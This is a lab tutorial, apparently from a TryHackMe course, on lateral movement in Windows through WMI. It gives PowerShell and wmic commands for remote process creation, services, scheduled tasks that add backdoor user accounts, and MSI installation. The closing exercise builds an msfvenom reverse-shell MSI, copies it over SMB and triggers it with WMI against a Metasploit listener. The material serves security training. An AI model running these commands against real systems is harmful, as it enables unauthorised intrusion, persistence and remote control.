# Moving Laterally Using WMI

We can perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows' implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

---

## Connecting to WMI From PowerShell

Before connecting to WMI using PowerShell commands, we need to create a `PSCredential` object with our username and password. This object will be stored in the `$credential` variable and used throughout the techniques in this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then establish a WMI session using either of the following protocols:

- **DCOM**: RPC over IP (port `135/TCP` and ports `49152-65535/TCP`).
- **Wsman**: WinRM (port `5985/TCP` for HTTP or `5986/TCP` for HTTPS).

To establish a WMI session from PowerShell:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet configures the connection options for the WMI session, including the protocol. These options and credentials are passed to the `New-CimSession` cmdlet to establish a session against a remote host.

---

## Remote Process Creation Using WMI

- **Ports**: `135/TCP`, `49152-65535/TCP` (DCERPC), `5985/TCP` (WinRM HTTP), `5986/TCP` (WinRM HTTPS)
- **Required Group Memberships**: Administrators

To remotely spawn a process using WMI:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = $Command
}
```

On legacy systems, the same can be done using `wmic`:

```cmd
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

---

## Creating Services Remotely with WMI

- **Ports**: `135/TCP`, `49152-65535/TCP` (DCERPC), `5985/TCP` (WinRM HTTP), `5986/TCP` (WinRM HTTPS)
- **Required Group Memberships**: Administrators

To create a service called `THMService2`:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2";
    DisplayName = "THMService2";
    PathName = "net user munra2 Pass123 /add"; # Your payload
    ServiceType = [byte]::Parse("16"); # Win32OwnProcess: Start service in a new process
    StartMode = "Manual"
}
```

Start the service:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop and delete the service:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

---

## Creating Scheduled Tasks Remotely with WMI

- **Ports**: `135/TCP`, `49152-65535/TCP` (DCERPC), `5985/TCP` (WinRM HTTP), `5986/TCP` (WinRM HTTPS)
- **Required Group Memberships**: Administrators

To create and execute a scheduled task:

```powershell
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete the scheduled task:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

---

## Installing MSI Packages Through WMI

- **Ports**: `135/TCP`, `49152-65535/TCP` (DCERPC), `5985/TCP` (WinRM HTTP), `5986/TCP` (WinRM HTTPS)
- **Required Group Memberships**: Administrators

To install an MSI package:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi";
    Options = "";
    AllUsers = $false
}
```

On legacy systems, use `wmic`:

```cmd
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

---

## Let's Get to Work!

To complete this exercise, connect to `THMJMP2` using the credentials assigned to you on Task 1 from [this link](http://distributor.za.tryhackme.com/creds). For this exercise, we assume the following credentials:

- **User**: `ZA.TRYHACKME.COM\t1_corine.waters`
- **Password**: `Korine.1994`

### Steps:

1. Create an MSI payload with `msfvenom`:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
   ```

2. Copy the payload to the target using SMB:

   ```bash
   smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
   ```

3. Start a Metasploit handler:

   ```bash
   msf6 exploit(multi/handler) > set LHOST lateralmovement
   msf6 exploit(multi/handler) > set LPORT 4445
   msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
   msf6 exploit(multi/handler) > exploit
   ```

4. Start a WMI session from `THMJMP2`:

   ```powershell
   $username = 't1_corine.waters';
   $password = 'Korine.1994';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```

5. Trigger the payload:

   ```powershell
   Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
       PackageLocation = "C:\Windows\myinstaller.msi";
       Options = "";
       AllUsers = $false
   }
   ```